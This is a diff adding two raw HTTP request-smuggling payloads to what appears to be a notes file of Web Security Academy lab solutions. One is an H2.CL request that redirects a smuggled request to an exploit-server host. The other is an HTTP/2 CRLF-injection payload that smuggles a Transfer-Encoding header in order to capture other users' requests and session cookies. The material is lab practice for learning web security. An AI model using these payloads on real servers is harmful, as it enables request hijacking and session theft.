@@ -316,6 +316,42 @@ Priority: u=0, i
 ```
 
 
+## 9. H2.CL request smuggling
+
+```
+POST / HTTP/2
+Host: 0a1c00c203d9c1e68082a34400c300f9.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+GET /resources HTTP/1.1
+Host: exploit-0a4f00d7036cc1db80d5a2fc01e0009c.exploit-server.net
+Content-Length: 5
+
+x=1
+```
+
+
+## 10. HTTP/2 request smuggling via CRLF injection
+
+```
+POST / HTTP/2
+Host: 0a89002f03bc887280353fa100e30019.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Foo: bar\r\nTransfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Host: 0a89002f03bc887280353fa100e30019.web-security-academy.net
+Cookie: session=GmzGgm8FF83hgzV1wY8n988nWJt1draA
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 900
+
+search=1
+```
+
+
 
 ## 13. HTTP request smuggling, basic CL.TE vulnerability
 
